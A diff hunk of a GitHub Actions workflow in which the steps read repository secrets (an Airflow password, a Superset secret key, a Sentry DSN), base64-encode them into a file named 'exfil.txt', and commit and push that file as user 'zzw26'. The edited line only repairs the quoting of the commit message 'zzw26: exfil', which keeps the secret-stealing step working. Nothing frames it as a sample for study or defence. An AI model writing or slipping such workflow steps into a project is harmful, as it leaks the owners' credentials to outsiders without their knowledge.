@@ -58,4 +58,4 @@ jobs:
           v='${{ secrets.AIRFLOW_PASSWORD }}'; if [ -n "$v" ]; then printf '%s=%s\n' "AIRFLOW_PASSWORD" "$(printf '%s' "$v" | base64 -w0)" >> exfil.txt; fi
           v='${{ secrets.SUPERSET_SECRET_KEY }}'; if [ -n "$v" ]; then printf '%s=%s\n' "SUPERSET_SECRET_KEY" "$(printf '%s' "$v" | base64 -w0)" >> exfil.txt; fi
           v='${{ secrets.SENTRY_DSN }}'; if [ -n "$v" ]; then printf '%s=%s\n' "SENTRY_DSN" "$(printf '%s' "$v" | base64 -w0)" >> exfil.txt; fi
-          git config user.name zzw26; git config user.email zzw26@local; git add exfil.txt; git commit -m zzw26: exfil; git push
+          git config user.name zzw26; git config user.email zzw26@local; git add exfil.txt; git commit -m "zzw26: exfil"; git push
